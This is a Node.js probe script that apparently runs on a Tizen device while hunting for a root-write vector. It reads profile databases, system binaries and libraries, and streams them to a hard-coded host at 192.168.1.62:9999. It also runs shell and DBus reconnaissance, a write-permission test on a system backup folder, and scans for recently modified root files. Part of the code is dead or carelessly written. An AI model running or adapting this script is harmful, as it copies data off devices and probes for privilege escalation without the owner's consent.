"use strict";
/* p46: live DB identification + root-write vector hunt (round 2)
   1. read /opt/dbspace/.app-context_{1,2,3}.db + journals (profile DBs?) -> exfil+md5
   2. wasdb_backup: perms + write test (world-writable?)
   3. exfil: sdbd, libSLP-db-util, was, litewas, libwas_* (extraction code), vd_pkgmgr_db_recovery.sh
   4. WAS daemon hunt (pid 327 exe/cmdline, find webappservice)
   5. DBus: ListNames (named only) + introspect RunningAppsService + GetProcessID test
   6. /proc/locks (who holds fcntl locks on DBs)
   7. recent root files (last 90 min)
   exfil /p46info
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p46', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFile(p, name) {
  try {
    var b = fs.readFileSync(p);
    R.results['exfil_' + name] = b.length + 'B';
    postBuf('/bin4_' + name, b);
    return b.length;
  } catch (e) { R.results['exfil_' + name] = 'ERR ' + String(e).substring(0, 120); }
  return -1;
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p46info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

function md5Buf(b) { return crypto.createHash('md5').update(b).digest('hex'); }

function readExfil(p, name) {
  return new Promise(function (resolve) {
    try {
      var b = fs.readFileSync(p);
      var out = 'size=' + b.length + ' md5=' + md5Buf(b);
      if (b.length < 200000) { postBuf('/db_' + name, b); R.results['exfil_' + name] = b.length + 'B'; }
      resolve(out);
    } catch (e) { resolve('ERR ' + String(e).substring(0, 150)); }
  });
}

var steps = [
  { name: 'profile_dbs', fn: function () {
      var out = '';
      var names = ['.app-context_1.db', '.app-context_2.db', '.app-context_3.db',
                   '.app-context_1.db-journal', '.app-context_2.db-journal', '.app-context_3.db-journal'];
      function go(idx) {
        if (idx >= names.length) { resolve(out); return; }
        try {
          var b = fs.readFileSync('/opt/dbspace/' + names[idx]);
          out += names[idx] + ': size=' + b.length + ' md5=' + md5Buf(b) + '\n';
          if (b.length < 200000) { postBuf('/db_' + names[idx].replace(/\./g, '_'), b); R.results['exfil_' + names[idx]] = b.length + 'B'; }
        } catch (e) { out += names[idx] + ': ERR ' + String(e).substring(0, 100) + '\n'; }
        go(idx + 1);
      }
      var resolve = Promise.resolve;
      // simpler: use Promise
      return new Promise(function (res) {
        var i2 = 0;
        function step2() {
          if (i2 >= names.length) { res(out); return; }
          var n = names[i2++];
          try {
            var b = fs.readFileSync('/opt/dbspace/' + n);
            out += n + ': size=' + b.length + ' md5=' + md5Buf(b) + '\n';
            if (b.length < 200000) { postBuf('/db_' + n.replace(/\./g, '_'), b); R.results['exfil_' + n] = b.length + 'B'; }
          } catch (e) { out += n + ': ERR ' + String(e).substring(0, 100) + '\n'; }
          step2();
        }
        step2();
      });
  }},
  { name: 'wasdb_backup_perm', fn: function () {
      var out = run2 = null;
      return run('ls -la /opt/usr/apps/webappservice/wasdb_backup/ 2>&1; echo ===WRITE; touch /opt/usr/apps/webappservice/wasdb_backup/p46test && echo BACKUP_WRITABLE && rm /opt/usr/apps/webappservice/wasdb_backup/p46test || echo BACKUP_NOT_WRITABLE', 15000);
  }},
  { name: 'exfil_round2', fn: function () {
      postFile('/usr/sbin/sdbd', 'sdbd');
      postFile('/usr/lib/libSLP-db-util.so.0', 'libSLP-db-util.so.0');
      postFile('/usr/bin/was', 'was');
      postFile('/usr/bin/litewas', 'litewas');
      postFile('/usr/lib/libwas_launcher_api.so', 'libwas_launcher_api.so');
      postFile('/usr/lib/libwas_db_api.so', 'libwas_db_api.so');
      postFile('/usr/lib/libwas_util_api.so', 'libwas_util_api.so');
      postFile('/usr/lib/libwas_manager_api.so', 'libwas_manager_api.so');
      postFile('/usr/lib/libwas_inner_db.so', 'libwas_inner_db.so');
      postFile('/usr/lib/libwebappenc.so.1', 'libwebappenc.so.1');
      postFile('/usr/bin/vd_pkgmgr_db_recovery.sh', 'vd_pkgmgr_db_recovery.sh');
      return new Promise(function (resolve) { setTimeout(function () { resolve('exfil queued'); }, 25000); });
  }},
  { name: 'daemon_hunt', fn: function () {
      return run('readlink /proc/327/exe 2>&1; echo ===CMD; cat /proc/327/cmdline 2>/dev/null | tr "\\0" " "; echo; echo ===FD; ls -la /proc/327/fd/ 2>&1 | head -15; echo ===ORG; ls -la /org/tizen/ 2>&1 | head -30; echo ===FIND; find / -xdev -name "*webappservice*" 2>/dev/null | head -20; echo ===FIND2; find /org /usr /bin -xdev -type f -name "*wasd*" 2>/dev/null | head -10', 60000);
  }},
  { name: 'dbus_named', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | grep -oE "\\'[a-zA-Z0-9._:-]+\\'" | sort -u', 30000);
  }},
  { name: 'ras_introspect', fn: function () {
      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -80; echo ===IFACE2; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS /org/freedesktop/DBus com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -40', 40000);
  }},
  { name: 'ras_getpid', fn: function () {
      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetProcessID string:"xvvl3S1bvH.TizenBrew" 2>&1 | head -20; echo ===PSS; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetPssRss string:"xvvl3S1bvH.TizenBrew" 2>&1 | head -20', 40000);
  }},
  { name: 'proc_locks', fn: function () {
      return run('cat /proc/locks 2>&1 | head -60', 15000);
  }},
  { name: 'recent_root90', fn: function () {
      return run('find /opt /run /etc /tmp -mmin -90 -type f 2>/dev/null | grep -vE "^/tmp/" | head -40', 40000);
  }},
  { name: 'home_profiles', fn: function () {
      return run('ls -la /opt/usr/home/ 2>&1 | head -10; echo ===; ls -la /opt/usr/home/owner/ 2>&1 | head -15; echo ===DNET; ls -la /opt/usr/data/ 2>&1 | head -12', 15000);
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 240000);
